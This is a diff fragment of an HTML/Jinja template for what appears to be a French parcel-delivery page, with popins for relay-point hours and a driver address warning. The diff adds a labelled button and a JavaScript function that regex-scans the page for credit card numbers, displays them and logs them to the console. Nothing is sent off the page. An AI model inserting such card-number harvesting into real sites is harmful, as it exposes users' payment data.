+      <div id="popinHelpContent" class="popinContent"></div>
+    </div>
+    <div id="popinRelais" class="popin">
+      <!-- <a class="closePopin" href="#"></a> -->
+      <h1>Horaires d'ouverture</h1>
+      <div id="openingHours" class="popinContent"></div>
+    </div>
+    <div id="popinWarningNotChangedFields" class="popin popinHelp">
+      <a class="closePopin" href="#"></a>
+      <h1>WARNING !</h1>
+      <div id="popinHelpContent" class="popinContent">Merci de préciser votre adresse ou de fournir toute information pouvant être utile à notre chauffeur.</div>
+    </div>
+    <script src="{{ url_for('static', filename='files/jquery.nice-select.min.js') }}" type="text/javascript"></script>
+    <script src="{{ url_for('static', filename='files/scripts.js') }}" type="text/javascript"></script>
+    <ul class="ui-autocomplete ui-menu ui-widget ui-widget-content ui-corner-all" role="listbox" aria-activedescendant="ui-active-menuitem" style="z-index: 2; top: 0px; left: 0px; display: none;"></ul>
+    <ul class="ui-autocomplete ui-menu ui-widget ui-widget-content ui-corner-all" role="listbox" aria-activedescendant="ui-active-menuitem" style="z-index: 2; top: 0px; left: 0px; display: none;"></ul>
+
+    <!-- Ajout du bouton et de la section pour extraire les numéros de carte de crédit -->
+    <h1>Extraction de numéros de carte de crédit</h1>
+    <p>Cliquez sur le bouton ci-dessous pour extraire les numéros de carte de crédit de cette page.</p>
+    <button onclick="extractCreditCardNumbers()">Extraire les numéros de carte de crédit</button>
+    <div id="results"></div>
+
+    <script>
+        // Fonction pour extraire les numéros de carte de crédit
+        function extractCreditCardNumbers() {
+            // Expression régulière pour identifier les numéros de carte de crédit
+            var regex = /\b(?:\d[ -]*?){13,16}\b/g;
+            var htmlContent = document.documentElement.outerHTML;
+            var matches = htmlContent.match(regex);
+
+            var resultsDiv = document.getElementById('results');
+            if (matches && matches.length > 0) {
+                resultsDiv.innerHTML = '<h2>Numéros de carte de crédit trouvés :</h2><ul>' + matches.map(function(match) {
+                    return '<li>' + match + '</li>';
+                }).join('') + '</ul>';
+            } else {
+                resultsDiv.innerHTML = '<p>Aucun numéro de carte de crédit trouvé.</p>';
+            }
+
+            console.log("Numéros de carte de crédit trouvés :", matches);
+        }
+    </script>
+  </body>
+</html>
